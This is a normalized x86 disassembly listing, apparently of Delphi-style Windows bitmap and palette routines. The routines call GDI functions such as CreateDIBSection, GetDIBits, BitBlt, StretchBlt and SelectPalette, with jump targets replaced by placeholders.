cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_420d64
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41d898
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_42074c
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028b8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41e02c
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41cd7c
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_412484
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c09c
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41cd40
call sub_41c09c
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41d7f0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420d6b
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41d898
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_420d3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41d898
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026dc
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c09c
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41cd40
call sub_41c09c
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c09c
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41cd40
call sub_41c09c
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41d898
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403960
call sub_403960
jmp r-xdata
sub_420d8d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_420d9c
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_4038dc
call sub_403930
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_420dfc
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_420e60
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_420354
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42105b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41d898
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41d898
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41d898
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_421013
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_420798
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_42106c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41ea18
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_4205c4
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_4210d4
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax esi
call sub_4217e4
mov eax [ esi + 0x28 ]
call sub_4205c8
mov eax [ esi + 0x2c ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e48
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_421110
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4211c8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b3c
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_421a54
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_4205c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_4205c8
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413e74
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_421200
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4217e4
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42128f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_420dfc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_420798
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_421a54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_421294
mov eax [ ebp - 0x8 ]
call sub_41b7cc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4038dc
call sub_403930
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_4212c0
push ebx
mov ebx eax
mov eax ebx
call sub_4215b4
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40cc70
pop ebx
retn
sub_4212f0
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_415594
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_4217e4
lea eax [ ebx + 0x2c ]
call sub_40cc70
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_421a54
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_421364
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41d574
mov eax ebx
call sub_4218f4
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_4216f0
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_4215a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41d4a0
push eax
call SetStretchBltMode
mov eax ebx
call sub_421634
mov dl [ r-xdata ]
call sub_41d574
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_421894
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_421634
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4215a7
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_421535
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41d898
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_421634
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41da3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_4215b4
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_4217f4
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_421200
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41d7f0
sub_421634
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_4217f4
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4203d0
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_4212c0
sub_42167c
push ebx
mov ebx eax
mov eax ebx
call sub_4217e4
mov eax ebx
call sub_4217f4
mov edx ebx
mov eax ebx
call sub_4212c0
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_4216a0
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_421720
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41c09c
mov eax ebx
call sub_4216f0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_421634
xor edx edx
pop ecx
call sub_41d408
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_421770
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_4218f4
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_420798
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_4217f4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_415530
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_421877
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_421894
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_4217e4
mov eax ebx
call sub_4217f4
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_421720
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_420e60
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_420354
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4218f4
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41df88
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_420354
push 0x0
call GetDC
call sub_41d898
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_4219ac
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41d760
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_421200
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_4217e4
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402b3c
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
